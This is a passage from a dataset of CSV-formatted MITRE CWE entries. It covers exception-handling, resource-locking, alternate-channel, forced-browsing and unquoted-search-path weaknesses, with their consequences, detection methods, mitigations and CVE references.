NAME:Catching NullPointerException::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR08-J:ENTRY NAME:Do not catch NullPointerException or any of its ancestors::\",,\"\",\n396,\"Declaration of Catch for Generic Exception\",Base,Draft,\"Catching overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.\",\"Multiple catch blocks can get ugly and repetitive, but condensing catch blocks by catching a high-level class like Exception can obscure exceptions that deserve special treatment or that should not be caught at this point in the program. Catching an overly broad exception essentially defeats the purpose of a language's typed exceptions, and can become particularly dangerous if the program grows and begins to throw new types of exceptions. The new exception types will not receive any attention.\",::NATURE:ChildOf:CWE ID:705:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:755:VIEW ID:1000::NATURE:ChildOf:CWE ID:221:VIEW ID:1000::,\"\",::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Python:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Non-Repudiation:SCOPE:Other:IMPACT:Hide Activities:IMPACT:Alter Execution Logic::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Overly-Broad Catch Block::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP5:ENTRY NAME:Ambiguous Exception Type::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-396::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-CWE-396::\",,\"\",\n397,\"Declaration of Throws for Generic Exception\",Base,Draft,\"Throwing overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.\",\"Declaring a method to throw Exception or Throwable makes it difficult for callers to perform proper error handling and error recovery. Java's exception mechanism, for example, is set up to make it easy for callers to anticipate what can go wrong and write code to handle each specific exceptional circumstance. Declaring that a method throws a generic form of exception defeats this system.\",::NATURE:ChildOf:CWE ID:705:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:221:VIEW ID:1000::NATURE:ChildOf:CWE ID:703:VIEW ID:1000::,\"\",::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Non-Repudiation:SCOPE:Other:IMPACT:Hide Activities:IMPACT:Alter Execution Logic::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Overly-Broad Throws Declaration::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR07-J:ENTRY NAME:Do not throw RuntimeException, Exception, or Throwable::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP5:ENTRY NAME:Ambiguous Exception Type::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-397::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-CWE-397::\",,\"::TYPE:Applicable Platform:NOTE:For C++, this weakness only applies to C++98, C++03, and C++11. It relies on a feature known as Dynamic Exception Specification, which was part of early versions of C++ but was deprecated in C++11. It has been removed for C++17 and later.::\",\n403,\"Exposure of File Descriptor to Unintended Control Sphere ('File Descriptor Leak')\",Base,Draft,\"A process does not close sensitive file descriptors before invoking a child process, which allows the child to perform unauthorized I/O operations using those descriptors.\",\"When a new process is forked or executed, the child process inherits any open file descriptors. When the child process has fewer privileges than the parent process, this might introduce a vulnerability if the child process can access the file descriptor but does not have the privileges to access the associated file.\",::NATURE:ChildOf:CWE ID:402:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Unix:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"::TERM:File descriptor leak:DESCRIPTION:While this issue is frequently called a file descriptor leak, the leak term is often used in two different ways - exposure of a resource, or consumption of a resource. Use of this term could cause confusion.::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"\",\"\",\"::REFERENCE:CVE-2003-0740:DESCRIPTION:Server leaks a privileged file descriptor, allowing the server to be hijacked.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0740::REFERENCE:CVE-2004-1033:DESCRIPTION:File descriptor leak allows read of restricted files.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1033::REFERENCE:CVE-2000-0094:DESCRIPTION:Access to restricted resource using modified file descriptor for stderr.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0094::REFERENCE:CVE-2002-0638:DESCRIPTION:Open file descriptor used as alternate channel in complex race condition.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0638::REFERENCE:CVE-2003-0489:DESCRIPTION:Program does not fully drop privileges after creating a file descriptor, which allows access to the descriptor via a separate vulnerability.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0489::REFERENCE:CVE-2003-0937:DESCRIPTION:User bypasses restrictions by obtaining a file descriptor then calling setuid program, which does not close the descriptor.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0937::REFERENCE:CVE-2004-2215:DESCRIPTION:Terminal manager does not properly close file descriptors, allowing attackers to access terminals of other users.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2215::REFERENCE:CVE-2006-5397:DESCRIPTION:Module opens a file for reading twice, allowing attackers to read files.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-5397::\",,::System Process::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:UNIX file descriptor leak::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO42-C:ENTRY NAME:Ensure files are properly closed when they are no longer needed::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",,\"\",\n408,\"Incorrect Behavior Order: Early Amplification\",Base,Draft,\"The product allows an entity to perform a legitimate but expensive operation before authentication or authorization has taken place.\",\"\",::NATURE:ChildOf:CWE ID:405:VIEW ID:1000::NATURE:ChildOf:CWE ID:696:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Amplification:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):NOTE:System resources, CPU and memory, can be quickly consumed. This can lead to poor system performance or system crash.::\",\"\",\"\",\"::REFERENCE:CVE-2004-2458:DESCRIPTION:Tool creates directories before authenticating user.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2458::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Early Amplification::\",,\"::TYPE:Relationship:NOTE:Overlaps authentication errors.::\",\n409,\"Improper Handling of Highly Compressed Data (Data Amplification)\",Base,Incomplete,\"The product does not handle or incorrectly handles a compressed input with a very high compression ratio that produces a large output.\",\"An example of data amplification is a decompression bomb, a small ZIP file that can produce a large amount of data when it is decompressed.\",::NATURE:ChildOf:CWE ID:405:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Amplification:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):NOTE:System resources, CPU and memory, can be quickly consumed. This can lead to poor system performance or system crash.::\",\"\",\"\",\"::REFERENCE:CVE-2009-1955:DESCRIPTION:XML bomb in web server module:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1955::REFERENCE:CVE-2003-1564:DESCRIPTION:Parsing library allows XML bomb:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1564::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Data Amplification::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS04-J:ENTRY NAME:Limit the size of files passed to ZipInputStream::\",,\"\",\n410,\"Insufficient Resource Pool\",Base,Incomplete,\"The product's resource pool is not large enough to handle peak demand, which allows an attacker to prevent others from accessing the resource by using a (relatively) large number of requests for resources.\",\"Frequently the consequence is a flood of connection or sessions.\",::NATURE:ChildOf:CWE ID:664:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:400:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Availability:SCOPE:Integrity:SCOPE:Other:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Other:NOTE:Floods often cause a crash or other problem besides denial of the resource itself; these are likely examples of *other* vulnerabilities, not an insufficient resource pool.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Do not perform resource-intensive transactions for unauthenticated users and/or invalid requests.::PHASE:Architecture and Design:DESCRIPTION:Consider implementing a velocity check mechanism which would detect abusive behavior.::PHASE:Operation:DESCRIPTION:Consider load balancing as an option to handle heavy loads.::PHASE:Implementation:DESCRIPTION:Make sure that resource handles are properly closed when no longer needed.::PHASE:Architecture and Design:DESCRIPTION:Identify the system's resource intensive operations and consider protecting them from abuse (e.g. malicious automated script which runs the resources out).::\",\"::REFERENCE:CVE-1999-1363:DESCRIPTION:Large number of locks on file exhausts the pool and causes crash.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1363::REFERENCE:CVE-2001-1340:DESCRIPTION:Product supports only one connection and does not disconnect a user who does not provide credentials.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1340::REFERENCE:CVE-2002-0406:DESCRIPTION:Large number of connections without providing credentials allows connection exhaustion.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0406::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insufficient Resource Pool::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A9:ENTRY NAME:Denial of Service:MAPPING FIT:CWE More Specific::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:TPS00-J:ENTRY NAME:Use thread pools to enable graceful degradation of service during traffic bursts::\",,\"\",\n412,\"Unrestricted Externally Accessible Lock\",Base,Incomplete,\"The product properly checks for the existence of a lock, but the lock can be externally controlled or influenced by an actor that is outside of the intended sphere of control.\",\"This prevents the product from acting on associated resources or performing other behaviors that are controlled by the presence of the lock. Relevant locks might include an exclusive lock or mutex, or modifying a shared resource that is treated as a lock. If the lock can be held for an indefinite period of time, then the denial of service could be permanent.\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:410:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):NOTE:When an attacker can control a lock, the program may wait indefinitely until the attacker releases the lock, causing a denial of service to other users of the program. This is especially problematic if there is a blocking operation on the lock.::\",\"::METHOD:White Box:DESCRIPTION:Automated code analysis techniques might not be able to reliably detect this weakness, since the application's behavior and general security model dictate which resource locks are critical. Interpretation of the weakness might require knowledge of the environment, e.g. if the existence of a file is used as a lock, but the file is created in a world-writable directory.::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Use any access control that is offered by the functionality that is offering the lock.::PHASE:Architecture and Design Implementation:DESCRIPTION:Use unpredictable names or identifiers for the locks. This might not always be possible or feasible.::PHASE:Architecture and Design:DESCRIPTION:Consider modifying your code to use non-blocking synchronization methods.::\",\"::REFERENCE:CVE-2001-0682:DESCRIPTION:Program can not execute when attacker obtains a mutex.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0682::REFERENCE:CVE-2002-1914:DESCRIPTION:Program can not execute when attacker obtains a lock on a critical output file.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1914::REFERENCE:CVE-2002-1915:DESCRIPTION:Program can not execute when attacker obtains a lock on a critical output file.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1915::REFERENCE:CVE-2002-0051:DESCRIPTION:Critical file can be opened with exclusive read access by user, preventing application of security policy. Possibly related to improper permissions, large-window race condition.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0051::REFERENCE:CVE-2000-0338:DESCRIPTION:Chain: predictable file names used for locking, allowing attacker to create the lock beforehand. Resultant from permissions and randomness.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0338::REFERENCE:CVE-2000-1198:DESCRIPTION:Chain: Lock files with predictable names. Resultant from randomness.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1198::REFERENCE:CVE-2002-1869:DESCRIPTION:Product does not check if it can write to a log file, allowing attackers to avoid logging by accessing the file using an exclusive lock. Overlaps unchecked error condition. This is not quite CWE-412, but close.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1869::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unrestricted Critical Resource Lock::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Deadlock::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A9:ENTRY NAME:Denial of Service:MAPPING FIT:CWE More Specific::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:LCK00-J:ENTRY NAME:Use private final lock objects to synchronize classes that may interact with untrusted code::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:LCK07-J:ENTRY NAME:Avoid deadlock by requesting and releasing locks in the same order::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP22:ENTRY NAME:Unrestricted lock::\",::25::,\"::TYPE:Relationship:NOTE:This overlaps Insufficient Resource Pool when the pool is of size 1. It can also be resultant from race conditions, although the timing window could be quite large in some cases.::\",\n413,\"Improper Resource Locking\",Base,Draft,\"The product does not lock or does not correctly lock a resource when the product must have exclusive access to the resource.\",\"When a resource is not properly locked, an attacker could modify the resource while it is being operated on by the product. This might violate the product's assumption that the resource will not change, potentially leading to unexpected behaviors.\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Availability:IMPACT:Modify Application Data:IMPACT:DoS: Instability:IMPACT:DoS: Crash, Exit, or Restart::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Use a non-conflicting privilege scheme.::PHASE:Architecture and Design Implementation:DESCRIPTION:Use synchronization when locking a resource.::\",\"::REFERENCE:CVE-2022-20141:DESCRIPTION:Chain: an operating system kernel has insufficent resource locking (CWE-413) leading to a use after free (CWE-416).:LINK:https://www.cve.org/CVERecord?id=CVE-2022-20141::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insufficient Resource Locking::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:VNA00-J:ENTRY NAME:Ensure visibility when accessing shared primitive variables::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:VNA02-J:ENTRY NAME:Ensure that compound operations on shared variables are atomic::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:LCK00-J:ENTRY NAME:Use private final lock objects to synchronize classes that may interact with untrusted code::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP19:ENTRY NAME:Missing Lock::\",,\"\",\n414,\"Missing Lock Check\",Base,Draft,\"A product does not check to see if a lock is present before performing sensitive operations on a resource.\",\"\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Availability:IMPACT:Modify Application Data:IMPACT:DoS: Instability:IMPACT:DoS: Crash, Exit, or Restart::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Implement a reliable lock mechanism.::\",\"::REFERENCE:CVE-2004-1056:DESCRIPTION:Product does not properly check if a lock is present, allowing other attackers to access functionality.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1056::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Missing Lock Check::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP19:ENTRY NAME:Missing Lock::\",,\"\",\n419,\"Unprotected Primary Channel\",Base,Draft,\"The product uses a primary channel for administration or restricted functionality, but it does not properly protect the channel.\",\"\",::NATURE:ChildOf:CWE ID:923:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Do not expose administrative functionnality on the user UI.::PHASE:Architecture and Design:DESCRIPTION:Protect the administrative/restricted functionality with a strong authentication mechanism.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unprotected Primary Channel::\",::383::,\"\",\n420,\"Unprotected Alternate Channel\",Base,Draft,\"The product protects a primary channel, but it does not use the same level of protection for an alternate channel.\",\"\",::NATURE:ChildOf:CWE ID:923:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Identify all alternate channels and use the same protection mechanisms that are used for the primary channels.::\",\"::REFERENCE:CVE-2020-8004:DESCRIPTION:When the internal flash is protected by blocking access on the Data Bus (DBUS), it can still be indirectly accessed through the Instruction Bus (IBUS).:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8004::REFERENCE:CVE-2002-0567:DESCRIPTION:DB server assumes that local clients have performed authentication, allowing attacker to directly connect to a process to load libraries and execute commands; a socket interface also exists (another alternate channel), so attack can be remote.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0567::REFERENCE:CVE-2002-1578:DESCRIPTION:Product does not restrict access to underlying database, so attacker can bypass restrictions by directly querying the database.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1578::REFERENCE:CVE-2003-1035:DESCRIPTION:User can avoid lockouts by using an API instead of the GUI to conduct brute force password guessing.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1035::REFERENCE:CVE-2002-1863:DESCRIPTION:FTP service can not be disabled even when other access controls would require it.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1863::REFERENCE:CVE-2002-0066:DESCRIPTION:Windows named pipe created without authentication/access control, allowing configuration modification.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0066::REFERENCE:CVE-2004-1461:DESCRIPTION:Router management interface spawns a separate TCP connection after authentication, allowing hijacking by attacker coming from the same IP address.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1461::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unprotected Alternate Channel::\",,\"::TYPE:Relationship:NOTE:This can be primary to authentication errors, and resultant from unhandled error conditions.::\",\n421,\"Race Condition During Access to Alternate Channel\",Base,Draft,\"The product opens an alternate channel to communicate with an authorized user, but the channel is accessible to other actors.\",\"This creates a race condition that allows an attacker to access the channel before the authorized user does.\",::NATURE:ChildOf:CWE ID:420:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:362:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::REFERENCE:CVE-1999-0351:DESCRIPTION:FTP Pizza Thief vulnerability. Attacker can connect to a port that was intended for use by another client.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0351::REFERENCE:CVE-2003-0230:DESCRIPTION:Product creates Windows named pipe during authentication that another attacker can hijack by connecting to it.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0230::\",,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Alternate Channel Race Condition::\",,\"\",\n425,\"Direct Request ('Forced Browsing')\",Base,Incomplete,\"The web application does not adequately enforce appropriate authorization on all restricted URLs, scripts, or files.\",\"Web applications susceptible to direct request attacks often make the false assumption that such resources can only be reached through a given navigation path and so only apply authorization at certain points in the path.\",::NATURE:ChildOf:CWE ID:862:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:862:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:288:VIEW ID:1000::NATURE:ChildOf:CWE ID:424:VIEW ID:1000::NATURE:CanPrecede:CWE ID:471:VIEW ID:1000::NATURE:CanPrecede:CWE ID:98:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Web Based:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:forced browsing:DESCRIPTION:The forced browsing term could be misinterpreted to include weaknesses such as CSRF or XSS, so its use is discouraged.::\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Read Application Data:IMPACT:Modify Application Data:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity::\",\"\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Apply appropriate access control authorizations for each access to all restricted URLs, scripts or files.::PHASE:Architecture and Design:DESCRIPTION:Consider using MVC based frameworks such as Struts.::\",\"::REFERENCE:CVE-2022-29238:DESCRIPTION:Access-control setting in web-based document collaboration tool is not properly implemented by the code, which prevents listing hidden directories but does not prevent direct requests to files in those directories.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29238::REFERENCE:CVE-2022-23607:DESCRIPTION:Python-based HTTP library did not scope cookies to a particular domain such that supercookies could be sent to any domain on redirect.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-23607::REFERENCE:CVE-2004-2144:DESCRIPTION:Bypass authentication via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2144::REFERENCE:CVE-2005-1892:DESCRIPTION:Infinite loop or infoleak triggered by direct requests.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1892::REFERENCE:CVE-2004-2257:DESCRIPTION:Bypass auth/auth via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2257::REFERENCE:CVE-2005-1688:DESCRIPTION:Direct request leads to infoleak by error.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1688::REFERENCE:CVE-2005-1697:DESCRIPTION:Direct request leads to infoleak by error.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1697::REFERENCE:CVE-2005-1698:DESCRIPTION:Direct request leads to infoleak by error.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1698::REFERENCE:CVE-2005-1685:DESCRIPTION:Authentication bypass via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1685::REFERENCE:CVE-2005-1827:DESCRIPTION:Authentication bypass via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1827::REFERENCE:CVE-2005-1654:DESCRIPTION:Authorization bypass using direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1654::REFERENCE:CVE-2005-1668:DESCRIPTION:Access privileged functionality using direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1668::REFERENCE:CVE-2002-1798:DESCRIPTION:Upload arbitrary files via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1798::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Direct Request aka 'Forced Browsing'::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A10:ENTRY NAME:Failure to Restrict URL Access:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A2:ENTRY NAME:Broken Access Control:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:34:ENTRY NAME:Predictable Resource Location::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP30:ENTRY NAME:Missing endpoint authentication::\",::127::143::144::668::87::,\"::TYPE:Relationship:NOTE:Overlaps Modification of Assumed-Immutable Data (MAID), authorization errors, container errors; often primary to other weaknesses such as XSS and SQL injection.::TYPE:Theoretical:NOTE:Forced browsing is a step-based manipulation involving the omission of one or more steps, whose order is assumed to be immutable. The application does not verify that the first step was performed successfully before the second step. The consequence is typically authentication bypass or path disclosure, although it can be primary to all kinds of weaknesses, especially in languages such as PHP, which allow external modification of assumed-immutable variables.::\","
  },
  "doc-164608b7c213c63ab971534a904ded68": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n428,\"Unquoted Search Path or Element\",Base,Draft,\"The product uses a search path that contains an unquoted element, in which the element contains whitespace or other separators. This can cause the product to access resources in a parent path.\",\"If a malicious individual has access to the file system, it is possible to elevate privileges by inserting such a file as C:Program.exe to be run by a privileged program making use of WinExec.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM NAME:Windows NT:OPERATING SYSTEM PREVALENCE:Sometimes::OPERATING SYSTEM NAME:macOS:OPERATING SYSTEM PREVALENCE:Rarely::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Properly quote the full search path before executing a program on the system.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2005-1185:DESCRIPTION:Small handful of others. Program doesn't quote the C:Program Files path when calling a program to be executed - or any other path with a directory or file whose name contains a space - so attacker can put a malicious program.exe into 